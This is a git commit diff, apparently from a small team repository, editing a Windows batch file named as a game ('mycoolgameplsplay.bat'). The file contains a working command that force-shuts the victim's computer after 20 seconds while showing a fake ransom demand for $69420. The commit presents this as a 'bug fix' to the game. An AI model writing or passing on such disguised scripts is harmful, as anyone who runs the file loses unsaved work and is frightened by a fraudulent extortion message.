5f19dffacd2c9275eac714a6e96fc2667faad2f3
Andy Jiang <andyjiang9999@gmail.com>
2022-07-16 20:46:16 +1000

    bug fix to my awesome game!

--- team/mycoolgameplsplay.bat
+++ team/mycoolgameplsplay.bat
@@ -1,3 +1,3 @@
 @echo off
 echo Message here.
-shutdown -s -f -t 20 -c "You hav downloded a virus Please pay $69420 to get you comptuer back before it shuts down forvere"
+shutdown -s -f -t 20 -c "You hav downloded a virus Please pay $69420 to get you comptuer back before it shuts down forvere you have 20 seconds"
